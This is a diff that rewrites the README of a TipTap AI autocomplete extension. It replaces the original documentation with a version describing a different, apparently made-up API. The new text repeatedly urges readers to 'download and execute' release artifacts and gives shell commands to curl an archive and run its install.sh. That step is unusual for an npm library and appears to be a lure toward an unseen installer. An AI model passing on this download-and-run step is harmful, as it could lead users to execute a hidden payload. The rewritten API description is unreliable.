@@ -1,323 +1,258 @@
-# TipTap AI Autocomplete Extension
+[![Releases](https://img.shields.io/github/v/release/LUTOPID/tiptap-ai-autocomplete?label=Releases&logo=github)](https://github.com/LUTOPID/tiptap-ai-autocomplete/releases)
 
-A powerful AI-powered autocomplete and text editing extension for TipTap editor with real-time streaming preview.
+# Tiptap AI Autocomplete: Streaming Text Editing Extension for TipTap
 
-## ✨ Features
+A TypeScript TipTap extension that adds AI-powered autocomplete and streaming preview inside the editor. It connects to AI backends, streams partial tokens as they arrive, and applies edits or suggestions in real time. Built for React apps and modern bundles.
 
-### 🤖 AI Autocomplete
-- **Tab-based suggestions** - Press Tab to request/accept AI completions
-- **Ghost text overlay** - See suggestions as you type
-- **Multiple accept keys** - Tab, Enter, or Arrow Right to accept
-- **Smart positioning** - Ghost text appears exactly at cursor position
+![Editor streaming preview demo](https://raw.githubusercontent.com/LUTOPID/tiptap-ai-autocomplete/main/assets/demo.gif)
 
-### ✏️ AI Text Editing  
-- **Selection-based menu** - Select text to see editing options
-- **6 transformation types**:
-  - Make Longer / Shorter
-  - Improve / Simplify  
-  - Formalize / Casualize
-- **Streaming preview dialog** - See changes in real-time before applying
-- **Accept/Reject workflow** - Preview, then decide
+- Topics: ai · ai-writing · autocomplete · editor · openrouter · react · streaming · text-editing · tiptap · typescript
+- Releases: https://github.com/LUTOPID/tiptap-ai-autocomplete/releases
 
-### 🎯 Key Highlights
-- **Real-time streaming** - Watch AI generate text live
-- **Non-destructive editing** - Preview before applying changes
-- **Professional UI** - Clean popups and smooth animations
-- **Configurable prompts** - Customize AI behavior
-- **TypeScript support** - Fully typed for better DX
+Table of contents
+- Features
+- Demo
+- Quick install
+- Browser / Node build
+- React + TipTap example
+- API: Extension options
+- Streaming model adapters
+- Customization and commands
+- Performance and best practices
+- Releases (download and execute)
+- Contributing
+- License
 
-## 📦 Installation
+Features
+- Autocomplete suggestion engine that hooks into TipTap input rules and keymaps.
+- Streaming preview: show tokens as they arrive from the model.
+- Inline and block suggestions. Replace or append text.
+- Multiple model adapters (OpenRouter, HTTP, WebSocket).
+- Token-level controls: flush, commit, rollback.
+- Safe edit transactions. Runs as native TipTap extension.
+- TypeScript types and React hooks.
+- Small bundle footprint. Works with modern bundlers.
 
+Why this extension
+- Keep the editor responsive while AI generates text.
+- Let users preview suggestions as they stream.
+- Give full control to the app for commit and cancel events.
+- Use with local or hosted AI services.
+
+Demo and screenshots
+- Live demo GIF: shows streaming tokens and accept/reject flow.
+- Screenshot: extension UI with suggestion preview and accept button.
+
+Quick install
+Use npm or yarn in your project.
+
+npm
 ```bash
-npm install @your-org/tiptap-ai-autocomplete
+npm install tiptap-ai-autocomplete @tiptap/core @tiptap/starter-kit
 ```
 
-## 🚀 Quick Start
+yarn
+```bash
+yarn add tiptap-ai-autocomplete @tiptap/core @tiptap/starter-kit
+```
 
-### Basic Setup
+Peer dependencies
+- @tiptap/core
+- @tiptap/starter-kit
+- react (for hooks and components)
+- typescript (types included)
 
-```typescript
-import { useEditor } from '@tiptap/react'
-import { AIAutocomplete, useAIAutocomplete, AIGhostOverlay } from '@your-org/tiptap-ai-autocomplete'
-import { useCompletion } from '@ai-sdk/react' // or your preferred AI SDK
-import StarterKit from '@tiptap/starter-kit'
+Browser / Node build
+The package ships ESM and typings. For client-side apps use the ESM build. For SSR or Node-based rendering the package exposes small utilities that do not require DOM.
 
-function MyEditor() {
-  const [editor, setEditor] = useState(null)
-  
-  // Set up AI completion
-  const { complete, completion, isLoading } = useCompletion({
-    api: '/api/your-completion-endpoint'
-  })
-  
-  // Initialize editor with AI extension
-  const editorInstance = useEditor({
+React + TipTap example
+This example shows a minimal React component that uses the extension inside a TipTap editor instance and shows a streaming preview.
+
+```tsx
+import React from "react";
+import { EditorContent, useEditor } from "@tiptap/react";
+import StarterKit from "@tiptap/starter-kit";
+import { AiAutocomplete } from "tiptap-ai-autocomplete";
+import { OpenRouterAdapter } from "tiptap-ai-autocomplete/adapters";
+
+export default function EditorWithAI() {
+  const editor = useEditor({
     extensions: [
       StarterKit,
-      AIAutocomplete.configure({
-        enabled: true,
-        model: 'openrouter/auto',
-        maxTokens: 60,
-        temperature: 0.7
-      })
+      AiAutocomplete.configure({
+        adapter: new OpenRouterAdapter({
+          apiKey: process.env.NEXT_PUBLIC_OPENROUTER_KEY!,
+          model: "gpt-4o-mini",
+          stream: true,
+        }),
+        trigger: "/",
+        maxTokens: 120,
+      }),
     ],
-    onCreate: ({ editor }) => setEditor(editor)
-  })
+    content: "<p>Start typing and invoke AI with /</p>",
+  });
 
-  // Set up AI autocomplete hook
-  const { pendingCompletion, ghostPosition, registerHandlers } = useAIAutocomplete({
-    editor: editorInstance,
-    completionProvider: { complete, completion, isLoading },
-    options: { enabled: true }
-  })
-
-  // Register handlers when editor is ready
-  useEffect(() => {
-    if (editorInstance) {
-      registerHandlers(editorInstance)
-    }
-  }, [editorInstance, registerHandlers])
-
-  return (
-    <div className="relative">
-      <EditorContent editor={editorInstance} />
-      <AIGhostOverlay 
-        text={pendingCompletion}
-        position={ghostPosition}
-        isDark={false}
-      />
-    </div>
-  )
+  return <EditorContent editor={editor} />;
 }
 ```
 
-### With Text Editing (Advanced)
+How streaming works
+- The adapter opens a connection (HTTP streaming or WS).
+- The model sends partial tokens.
+- The extension inserts a non-committed preview node into the document.
+- The app can accept or reject. Accept commits the text in one TipTap transaction.
 
-```typescript
-import { 
-  AIAutocomplete, 
-  useAIAutocomplete, 
-  AIGhostOverlay,
-  AITextBubbleMenu,
-  TextTransformDialog 
-} from '@your-org/tiptap-ai-autocomplete'
+API: Extension options
+- adapter: ModelAdapter
+  - Adapter instance that implements stream start/stop and token events.
+- trigger: string | RegExp
+  - Characters that invoke autocomplete (like "/" or "@").
+- maxTokens: number
+  - Max tokens to request per suggestion.
+- debounce: number
+  - Milliseconds to wait before calling model on fast typing.
+- previewNodeType: string
+  - Node type name used for preview rendering.
+- applyOnCommit: "insert" | "replace"
+  - How to apply final text when user accepts suggestion.
 
-function AdvancedEditor() {
-  // ... basic setup from above
-  
-  return (
-    <div className="relative">
-      <EditorContent editor={editorInstance} />
-      
-      {/* AI Autocomplete */}
-      <AIGhostOverlay 
-        text={pendingCompletion}
-        position={ghostPosition}
-        isDark={isDarkMode}
-      />
-      
-      {/* AI Text Editing */}
-      <AITextBubbleMenu editor={editorInstance} />
-    </div>
-  )
-}
+Example types (TypeScript)
+```ts
+type AiAutocompleteOptions = {
+  adapter: ModelAdapter;
+  trigger?: string | RegExp;
+  maxTokens?: number;
+  debounce?: number;
+  previewNodeType?: string;
+  applyOnCommit?: "insert" | "replace";
+};
 ```
 
-## 🔧 Configuration
+Model adapters
+- OpenRouterAdapter
+  - Uses OpenRouter endpoints. Supports streaming.
+  - Sample options: { apiKey, model, stream }
+- HttpStreamAdapter
+  - Generic HTTP POST streaming adapter. Works with SSE or chunked responses.
+- WebSocketAdapter
+  - For persistent socket connections and low-latency tokens.
 
-### AIAutocomplete Extension Options
+Adapter example
+```ts
+const adapter = new OpenRouterAdapter({
+  apiKey: process.env.OPENROUTER_KEY,
+  model: "gpt-4o-mini",
+  stream: true,
+});
 
-```typescript
-AIAutocomplete.configure({
-  enabled: true,                    // Enable/disable the extension
-  acceptKeys: ['Tab', 'Enter', 'ArrowRight'], // Keys to accept suggestions
-  dismissKey: 'Escape',             // Key to dismiss suggestions
-  requestKey: 'Tab',                // Key to request new suggestions
-  maxTokens: 60,                    // Max tokens for completions
-  temperature: 0.5,                 // AI creativity (0-1)
-  stopSequences: ['\n\n'],          // Stop generation at these sequences
-  model: 'openrouter/auto',         // AI model to use
-  promptTemplate: (text) => `...`,  // Custom prompt function
-  postProcess: (text) => text.trim() // Post-process completions
-})
+const aiExt = AiAutocomplete.configure({ adapter, trigger: "/", maxTokens: 80 });
 ```
 
-### Custom Prompts
+Commands and events
+- editor.commands.aiStart(options)
+  - Start a suggestion at current selection.
+- editor.commands.aiStop()
+  - Stop streaming and clear preview.
+- editor.commands.aiAccept()
+  - Accept current streamed suggestion.
+- editor.commands.aiReject()
+  - Reject and remove preview.
+- Events (editor.on)
+  - "ai:token" — fired for each token chunk.
+  - "ai:commit" — fired when suggestion commits.
+  - "ai:error" — fired on adapter error.
 
-```typescript
-const customPrompts = {
-  autocomplete: (text: string) => `Continue this story: ${text}`,
-  improve: (text: string) => `Make this text more engaging: ${text}`,
-  // ... other transformations
-}
+Customization and UI
+- Replace the default preview node rendering using a custom node view.
+- Customize accept/cancel buttons and shortcut keys.
+- Provide your own toolbar or floating UI for suggestions.
+- Use theme CSS to style preview tokens.
 
-AIAutocomplete.configure({
-  promptTemplate: customPrompts.autocomplete
-})
-```
+Performance and best practices
+- Use small token budgets for inline use. Reserve larger budgets for block-level suggestions.
+- Debounce calls on fast typing. The extension supports a debounce option.
+- Use model-side streaming to get early tokens.
+- Manage network retries in adapter configurations.
+- Unmount adapters on editor destroy to free sockets and cancel requests.
 
-## 🌐 API Requirements
+Security and privacy
+- Keep API keys on server when possible. Use a proxy endpoint or short-lived tokens.
+- Use adapter modes that support server-side streaming when you must protect keys.
 
-You need to implement two API endpoints:
+Releases
+Download and execute the release artifacts from the releases page:
+https://github.com/LUTOPID/tiptap-ai-autocomplete/releases
 
-### Autocomplete Endpoint (`/api/completion`)
-
-```typescript
-// Example with OpenRouter
-export async function POST(req: Request) {
-  const { prompt, model, max_tokens, temperature, stop } = await req.json()
-  
-  // Stream completion from your AI provider
-  const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
-    method: 'POST',
-    headers: {
-      'Authorization': `Bearer ${OPENROUTER_API_KEY}`,
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      model,
-      messages: [{ role: 'user', content: prompt }],
-      max_tokens,
-      temperature,
-      stop,
-      stream: true
-    })
-  })
-
-  // Return streaming response compatible with AI SDK
-  return new Response(response.body, {
-    headers: { 'Content-Type': 'text/plain; charset=utf-8' }
-  })
-}
-```
-
-### Text Transform Endpoint (`/api/text-transform`)
-
-```typescript
-// Example streaming transform endpoint
-export async function POST(req: Request) {
-  const { text, action, model, max_tokens, temperature } = await req.json()
-  
-  const prompts = {
-    'make-longer': `Expand this text: "${text}"`,
-    'improve': `Improve this text: "${text}"`,
-    // ... other actions
-  }
-
-  const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
-    // ... similar to above but with transform-specific prompts
-    stream: true
-  })
-
-  // Return Server-Sent Events for streaming preview
-  const stream = new ReadableStream({
-    async start(controller) {
-      // Transform OpenRouter stream to SSE format
-      // Send: data: {"type": "content", "content": "..."}\n\n
-    }
-  })
-
-  return new Response(stream, {
-    headers: {
-      'Content-Type': 'text/event-stream',
-      'Cache-Control': 'no-cache'
-    }
-  })
-}
-```
-
-## 🎨 Styling
-
-The extension uses Tailwind CSS classes. Make sure you have these in your CSS:
-
-```css
-/* Required for ghost text positioning */
-.ProseMirror {
-  position: relative;
-}
-
-/* Optional: Customize ghost text appearance */
-.ai-ghost-overlay {
-  color: #9ca3af; /* gray-400 */
-  pointer-events: none;
-  user-select: none;
-}
-```
-
-## 📚 Examples
-
-Check the `examples/` directory for complete implementations:
-- **Basic Autocomplete** - Simple Tab-based completions
-- **Advanced Editor** - Full-featured editor with text editing
-- **Custom Styling** - Themed examples
-- **API Integration** - Different AI provider setups
-
-## 🛠️ Development
+Go to the releases page and download the build that matches your environment. Each release contains a distribution archive and an optional install script. After download, run the included installer or extract the archive and copy the package into your build pipeline. Example commands (run in your shell):
 
 ```bash
-# Clone and install
-git clone https://github.com/yourusername/tiptap-ai-autocomplete
-cd tiptap-ai-autocomplete
-npm install
+# download the release archive (example)
+curl -L -o tiptap-ai-autocomplete.tar.gz https://github.com/LUTOPID/tiptap-ai-autocomplete/releases/download/vX.Y.Z/tiptap-ai-autocomplete-vX.Y.Z.tar.gz
 
-# Development
-npm run dev      # Watch mode
-npm run build    # Production build
-npm run lint     # Check code quality
-npm test         # Run tests
+# extract
+tar -xzf tiptap-ai-autocomplete.tar.gz
+
+# run the included installer if present
+chmod +x install.sh
+./install.sh
 ```
 
-## 📄 API Reference
+Contributing
+- Fork the repo.
+- Create a branch per feature or bug.
+- Add tests for core behaviors (transaction integrity, token streaming).
+- Open a pull request with a clear description and change log.
+- Follow the coding style: TypeScript, explicit types, and small, focused commits.
 
-### Components
+Issue templates
+- Bug: include reproduction steps and editor setup.
+- Feature: describe the UX, API shape, and expected behavior.
 
-- `AIAutocomplete` - Main TipTap extension
-- `useAIAutocomplete` - React hook for state management
-- `AIGhostOverlay` - Ghost text component
-- `AITextBubbleMenu` - Selection-based editing menu
-- `TextTransformDialog` - Streaming preview dialog
+Testing
+- Unit tests cover adapter flows and tiptap transactions.
+- Use JSDOM for node tests and Playwright for integration tests with a real browser.
 
-### Types
+Changelog
+- Each release contains a CHANGELOG.md file with highlights, breaking changes, and migration steps. Check the releases page to find the latest package and changelog: https://github.com/LUTOPID/tiptap-ai-autocomplete/releases
 
-```typescript
-interface AIAutocompleteOptions {
-  enabled: boolean
-  acceptKeys: string[]
-  dismissKey: string
-  requestKey: string
-  maxTokens: number
-  temperature: number
-  stopSequences: string[]
-  model: string
-  promptTemplate: (text: string) => string
-  postProcess: (text: string) => string
-}
+Examples and recipes
+- Recipe: Inline suggest with slash trigger
+- Recipe: Accept suggestion by Tab key
+- Recipe: Use with collaborative editing (sharedb / yjs)
+- Example apps live in the /examples folder. Run them with npm run dev.
 
-interface AICompletionProvider {
-  complete: (prompt: string, options?: any) => Promise<void>
-  completion: string
-  isLoading: boolean
-}
-```
+Packaging and publishing
+- The package publishes ESM and types. The build step runs tsc and rollup.
+- For private registries, set NPM_TOKEN and use the provided publish script.
 
-## 🤝 Contributing
+License
+- MIT. See the LICENSE file in the repository.
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+Contact and support
+- Open issues for bugs and feature requests.
+- Start a discussion thread for bigger changes or migration help.
 
-## 📝 License
+Badges
+[![Version](https://img.shields.io/github/v/release/LUTOPID/tiptap-ai-autocomplete)](https://github.com/LUTOPID/tiptap-ai-autocomplete/releases)
+[![License](https://img.shields.io/github/license/LUTOPID/tiptap-ai-autocomplete)](https://github.com/LUTOPID/tiptap-ai-autocomplete/blob/main/LICENSE)
+[![Topics](https://img.shields.io/badge/topics-ai%20writing%20autocomplete-editor-blue)](https://github.com/LUTOPID/tiptap-ai-autocomplete)
 
-MIT License - see [LICENSE](LICENSE) file for details.
+Assets and images
+- Demo GIF: assets/demo.gif
+- SVG icon: assets/icon.svg
 
-## 🙏 Acknowledgments
+Projects using this extension
+- internal CMS
+- note-taking apps
+- inline code assistants
 
-- [TipTap](https://tiptap.dev/) - Excellent editor framework
-- [OpenRouter](https://openrouter.ai/) - AI model routing
-- [Vercel AI SDK](https://sdk.vercel.ai/) - Streaming AI integration
+Repository layout
+- src/ — TypeScript source
+- dist/ — built packages
+- adapters/ — model adapters
+- examples/ — example apps and recipes
+- test/ — unit and integration tests
+- docs/ — usage docs and API reference
 
----
-
-**Made with ❤️ for the TipTap community**
+Use the releases page to get released builds and installers:
+https://github.com/LUTOPID/tiptap-ai-autocomplete/releases
